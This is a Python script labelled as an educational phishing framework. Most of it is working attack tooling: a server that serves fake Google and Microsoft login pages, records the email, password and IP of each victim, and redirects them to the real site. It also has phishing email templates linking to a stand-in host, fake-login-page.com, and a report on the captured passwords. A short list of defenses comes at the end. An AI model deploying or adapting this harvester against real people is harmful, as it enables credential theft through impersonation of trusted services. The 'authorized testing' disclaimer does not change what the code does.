#!/usr/bin/env python3
"""
Educational Credential Harvester and Phishing Framework
Demonstrates: Social engineering, credential theft, session hijacking
FOR AUTHORIZED SECURITY TESTING ONLY
"""

import http.server
import socketserver
import urllib.parse
import base64
import json
import ssl
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class PhishingServer:
    """
    Fake login page server for credential harvesting
    """
    
    def __init__(self, port=8080, template="google"):
        self.port = port
        self.template = template
        self.captured_creds = []
        self.captured_sessions = []
        
    def generate_fake_page(self):
        """Generate convincing phishing page"""
        
        templates = {
            'google': '''
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f1f1f1; }
        .container { width: 450px; margin: 100px auto; background: white; padding: 40px; }
        .logo { text-align: center; margin-bottom: 20px; }
        h2 { text-align: center; color: #555; font-weight: normal; }
        input[type="email"], input[type="password"] {
            width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd;
            border-radius: 4px; box-sizing: border-box;
        }
        button {
            width: 100%; padding: 12px; background: #4285f4; color: white;
            border: none; border-radius: 4px; cursor: pointer;
        }
        button:hover { background: #357ae8; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #757575; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1 style="color: #4285f4;">Google</h1>
        </div>
        <h2>Sign in</h2>
        <p style="text-align: center; color: #555;">to continue to Gmail</p>
        <form action="/login" method="POST">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <button type="submit">Next</button>
        </form>
        <div class="footer">
            <p>One Google Account for everything Google</p>
        </div>
    </div>
</body>
</html>
            ''',
            
            'microsoft': '''
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your Microsoft account</title>
    <style>
        body { font-family: "Segoe UI", sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; margin: 0; }
        .container { width: 440px; margin: auto; padding-top: 100px; }
        .box { background: white; padding: 40px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { margin-bottom: 20px; }
        h2 { font-weight: 600; margin-bottom: 20px; }
        input { width: 100%; padding: 8px; border: none; border-bottom: 1px solid #ccc; margin-bottom: 20px; }
        button { background: #0067b8; color: white; border: none; padding: 8px 32px; float: right; }
    </style>
</head>
<body>
    <div class="container">
        <div class="box">
            <div class="logo">Microsoft</div>
            <h2>Sign in</h2>
            <form action="/login" method="POST">
                <input type="email" name="email" placeholder="Email, phone, or Skype" required>
                <input type="password" name="password" placeholder="Password" required>
                <p>No account? <a href="#">Create one!</a></p>
                <button type="submit">Sign in</button>
            </form>
        </div>
    </div>
</body>
</html>
            '''
        }
        
        return templates.get(self.template, templates['google'])
    
    def create_handler(self):
        """Create HTTP request handler"""
        server = self
        
        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # Suppress logs
            
            def do_GET(self):
                if self.path == '/':
                    # Serve fake login page
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(server.generate_fake_page().encode())
                    
                elif self.path == '/captured':
                    # Admin panel (password protected in real scenario)
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    data = {
                        'credentials': server.captured_creds,
                        'sessions': server.captured_sessions
                    }
                    self.wfile.write(json.dumps(data, indent=2).encode())
                
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                if self.path == '/login':
                    # Capture credentials
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length).decode()
                    params = urllib.parse.parse_qs(post_data)
                    
                    cred = {
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                        'ip': self.client_address[0],
                        'user_agent': self.headers.get('User-Agent'),
                        'email': params.get('email', [''])[0],
                        'password': params.get('password', [''])[0]
                    }
                    
                    server.captured_creds.append(cred)
                    print(f"\n[+] Captured credentials from {cred['ip']}")
                    print(f"    Email: {cred['email']}")
                    print(f"    Password: {cred['password']}")
                    
                    # Redirect to real site
                    self.send_response(302)
                    self.send_header('Location', 'https://accounts.google.com')
                    self.end_headers()
                
                else:
                    self.send_response(404)
                    self.end_headers()
        
        return Handler
    
    def start(self):
        """Start phishing server"""
        handler = self.create_handler()
        
        with socketserver.TCPServer(("", self.port), handler) as httpd:
            print(f"[*] Phishing server running on port {self.port}")
            print(f"[*] Template: {self.template}")
            print(f"[*] Captured data: http://localhost:{self.port}/captured")
            print(f"[!] Press Ctrl+C to stop\n")
            
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\n[*] Server stopped")
                print(f"\n[+] Total credentials captured: {len(self.captured_creds)}")
                for cred in self.captured_creds:
                    print(f"    {cred['email']}:{cred['password']}")


class EmailPhisher:
    """
    Phishing email campaign tool
    """
    
    def __init__(self, smtp_server, smtp_port=587):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        
    def craft_email(self, target, from_address, subject, template):
        """Create convincing phishing email"""
        
        templates = {
            'password_reset': f'''
Dear User,

We noticed suspicious activity on your account. For your security, please verify your identity by clicking the link below:

http://fake-login-page.com/verify?token={base64.b64encode(target.encode()).decode()}

If you did not request this, please ignore this email.

Best regards,
Security Team
            ''',
            
            'invoice': '''
Dear Customer,

Please find attached your recent invoice. Due to a system error, we need you to verify your payment information.

Click here to view invoice: [LINK]

Thank you for your business.
            ''',
            
            'urgent': '''
URGENT: Action Required

Your account will be suspended within 24 hours due to policy violations.

Click here to appeal: [LINK]

Failure to respond will result in permanent account deletion.
            '''
        }
        
        body = templates.get(template, templates['password_reset'])
        
        msg = MIMEMultipart()
        msg['From'] = from_address
        msg['To'] = target
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        
        return msg
    
    def send_campaign(self, targets, from_address, subject, template):
        """Send phishing emails to target list"""
        print(f"[*] Starting email campaign to {len(targets)} targets")
        
        for target in targets:
            try:
                msg = self.craft_email(target, from_address, subject, template)
                
                # In real scenario, would connect to SMTP server
                # server = smtplib.SMTP(self.smtp_server, self.smtp_port)
                # server.starttls()
                # server.login(username, password)
                # server.send_message(msg)
                # server.quit()
                
                print(f"[+] Would send to: {target}")
                time.sleep(random.uniform(1, 3))  # Rate limiting
                
            except Exception as e:
                print(f"[-] Failed to send to {target}: {e}")
        
        print("[*] Campaign complete")


class CredentialAnalyzer:
    """
    Analyze captured credentials for patterns
    """
    
    def analyze_password_strength(self, password):
        """Check password complexity"""
        score = 0
        checks = []
        
        if len(password) >= 8:
            score += 1
            checks.append("length")
        
        if any(c.isupper() for c in password):
            score += 1
            checks.append("uppercase")
        
        if any(c.islower() for c in password):
            score += 1
            checks.append("lowercase")
        
        if any(c.isdigit() for c in password):
            score += 1
            checks.append("digits")
        
        if any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in password):
            score += 1
            checks.append("special")
        
        if password.lower() in ['password', '123456', 'qwerty', 'admin']:
            score = 0
        
        return {
            'score': score,
            'strength': ['Very Weak', 'Weak', 'Fair', 'Good', 'Strong'][min(score, 4)],
            'checks': checks
        }
    
    def check_breached_database(self, email):
        """Check if email appears in breach databases (simulated)"""
        # In real tool: query HaveIBeenPwned API
        common_breaches = ['LinkedIn_2012', 'Adobe_2013', 'Equifax_2017']
        return random.choice([None, random.choice(common_breaches)])
    
    def generate_report(self, credentials):
        """Generate analysis report"""
        report = {
            'total_captured': len(credentials),
            'unique_domains': set(),
            'weak_passwords': 0,
            'breached_accounts': 0,
            'common_passwords': {}
        }
        
        password_patterns = {}
        
        for cred in credentials:
            email = cred['email']
            password = cred['password']
            
            # Extract domain
            if '@' in email:
                domain = email.split('@')[1]
                report['unique_domains'].add(domain)
            
            # Check strength
            strength = self.analyze_password_strength(password)
            if strength['score'] < 2:
                report['weak_passwords'] += 1
            
            # Check for common patterns
            base_pass = password.lower()
            password_patterns[base_pass] = password_patterns.get(base_pass, 0) + 1
            
            # Check breaches
            if self.check_breached_database(email):
                report['breached_accounts'] += 1
        
        report['common_passwords'] = dict(sorted(password_patterns.items(), 
                                                  key=lambda x: x[1], 
                                                  reverse=True)[:5])
        
        return report


def demonstrate_defense():
    """Show phishing defense strategies"""
    print("\n" + "="*60)
    print("PHISHING DEFENSE STRATEGIES")
    print("="*60)
    print("""
1. TECHNICAL CONTROLS
   - SPF, DKIM, DMARC email authentication
   - URL filtering and categorization
   - Attachment sandboxing
   - Anti-phishing browser extensions
   
2. USER TRAINING
   - Regular phishing simulations
   - Report phishing button in email client
   - Security awareness training
   - Reward positive security behaviors
   
3. DETECTION
   - Email gateway analysis
   - User behavior analytics (UBA)
   - Domain monitoring for lookalikes
   - Honeypot email accounts
   
4. INCIDENT RESPONSE
   - Reset compromised credentials immediately
   - Revoke active sessions
   - Check for lateral movement
   - Forensic analysis of phishing kit
   
5. PREVENTION
   - Multi-factor authentication (MFA)
   - Password managers (prevent credential reuse)
   - Least privilege access
   - Zero Trust architecture
""")


import time
import random

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "--server":
        server = PhishingServer(port=8080, template="google")
        server.start()
    else:
        demonstrate_defense()
